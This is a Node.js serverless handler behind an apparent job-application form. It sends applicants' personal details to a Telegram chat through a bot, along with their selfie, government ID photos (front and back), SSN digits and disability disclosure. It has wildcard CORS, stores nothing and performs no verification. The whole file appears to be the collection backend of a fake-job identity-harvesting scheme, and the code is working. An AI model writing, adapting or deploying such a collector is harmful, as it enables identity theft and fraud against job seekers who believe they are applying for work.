// SECURITY: Require environment variables - NO hardcoded fallbacks
const BOT_TOKEN = (process.env.TG_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TG_CHAT_ID || '').trim();
const TELEGRAM_API = 'https://api.telegram.org';

// Validate credentials are set
if (!BOT_TOKEN || !CHAT_ID) {
  console.error('[API] ERROR: TG_BOT_TOKEN and TG_CHAT_ID environment variables are required');
}

async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let bodyData = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    const { formData, files } = bodyData;

    if (!formData) {
      return res.status(400).json({ error: 'Missing formData', success: false });
    }

    // REQUIRED: Telegram credentials must be configured for submissions
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('[API] FATAL: Telegram credentials not configured. Rejecting submission.');
      return res.status(503).json({ 
        success: false,
        error: 'Application backend is not properly configured. Please contact the administrator.',
        timestamp: new Date().toISOString()
      });
    }

    // Step 1: Send text message
    const message = formatMessage(formData);
    const messageResponse = await fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const messageData = await messageResponse.json();
    if (!messageData.ok) {
      throw new Error(`Message failed: ${messageData.description}`);
    }

    // Step 2: Upload files using proper multipart/form-data
    let fileUploadErrors = [];
    if (files && Object.keys(files).length > 0) {
      const captions = {
        'a-selfie': '📸 Selfie',
        'a-id-photo-front': '🪪 Government ID - FRONT',
        'a-id-photo-back': '🪪 Government ID - BACK',
        'a-cv': '📄 Resume/CV'
      };

      for (const [fieldName, fileData] of Object.entries(files)) {
        if (!fileData?.data || !fileData?.name) continue;

        const isPhoto = ['a-selfie', 'a-id-photo-front', 'a-id-photo-back'].includes(fieldName);
        const endpoint = isPhoto ? 'sendPhoto' : 'sendDocument';
        const paramName = isPhoto ? 'photo' : 'document';
        const caption = captions[fieldName] || fieldName;

        // Decode base64 to binary
        const buffer = Buffer.from(fileData.data, 'base64');

        // Build multipart form body
        const boundary = 'TelegramUpload' + Date.now() + Math.random();
        let bodyStr = '';
        bodyStr += `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`;
        bodyStr += `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
        bodyStr += `--${boundary}\r\nContent-Disposition: form-data; name="${paramName}"; filename="${fileData.name}"\r\nContent-Type: ${fileData.type || 'application/octet-stream'}\r\n\r\n`;

        const bodyStart = Buffer.from(bodyStr);
        const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`);
        const fullBody = Buffer.concat([bodyStart, buffer, bodyEnd]);

        try {
          const fileResponse = await fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': `multipart/form-data; boundary=${boundary}`,
              'Content-Length': fullBody.length
            },
            body: fullBody
          });

          const fileResult = await fileResponse.json();
          if (!fileResult.ok) {
            const errorMsg = `File ${fieldName} upload failed: ${fileResult.description}`;
            console.error(`[API] ${errorMsg}`);
            fileUploadErrors.push(errorMsg);
          } else {
            console.log(`[API] ✓ File ${fieldName} uploaded successfully`);
          }
        } catch (err) {
          const errorMsg = `File ${fieldName} error: ${err.message}`;
          console.error(`[API] ${errorMsg}`);
          fileUploadErrors.push(errorMsg);
        }
      }
    }

    // If critical files failed, reject the entire submission
    const requiredFiles = ['a-selfie', 'a-id-photo-front', 'a-id-photo-back'];
    const failedRequired = fileUploadErrors.filter(e => 
      requiredFiles.some(req => e.includes(req))
    );
    if (failedRequired.length > 0) {
      throw new Error(`Required file uploads failed: ${failedRequired.join('; ')}`);
    }

    return res.status(200).json({ 
      success: true,
      message: 'Application submitted successfully',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('[API] Error:', error.message);
    return res.status(500).json({
      success: false,
      error: error.message || 'Submission failed',
      timestamp: new Date().toISOString()
    });
  }
}

function formatMessage(data) {
  let message = '📋 NEW APPLICATION RECEIVED\n\n';
  
  const sections = {
    '👤 Personal Information': ['a-fullname', 'a-email', 'a-phone', 'a-location'],
    '🏫 Education': ['a-highschool', 'a-highschool-status'],
    '💼 Professional': ['a-linkedin', 'a-github', 'a-role', 'a-experience', 'a-portfolio'],
    '🎯 Skills': ['a-sql', 'a-python', 'a-tableau', 'a-excel', 'a-coding'],
    '📋 Compliance': ['a-govid', 'a-ssn', 'a-availability', 'a-disability', 'a-productive-time'],
    '📝 Additional': ['a-cover', 'a-consent']
  };

  const labels = {
    'a-fullname': 'Full Name',
    'a-email': 'Email',
    'a-phone': 'Phone',
    'a-location': 'Location',
    'a-highschool': 'High School',
    'a-highschool-status': 'High School Status',
    'a-linkedin': 'LinkedIn',
    'a-github': 'GitHub',
    'a-role': 'Position',
    'a-experience': 'Years Experience',
    'a-portfolio': 'Portfolio URL',
    'a-sql': 'SQL Level',
    'a-python': 'Python Level',
    'a-tableau': 'Tableau Level',
    'a-excel': 'Excel Level',
    'a-coding': 'Coding Knowledge',
    'a-govid': 'Government ID Type',
    'a-ssn': 'SSN (Last 4)',
    'a-availability': 'Availability',
    'a-disability': 'Disability Disclosure',
    'a-productive-time': 'Most Productive Time',
    'a-cover': 'Cover Note',
    'a-consent': 'Consent'
  };

  for (const [section, fields] of Object.entries(sections)) {
    const hasContent = fields.some(f => data[f]);
    if (!hasContent) continue;
    message += `*${section}*\n`;
    fields.forEach(field => {
      if (data[field]) {
        const label = labels[field] || field;
        message += `• ${label}: ${data[field]}\n`;
      }
    });
    message += '\n';
  }

  return message;
}

module.exports = handler;
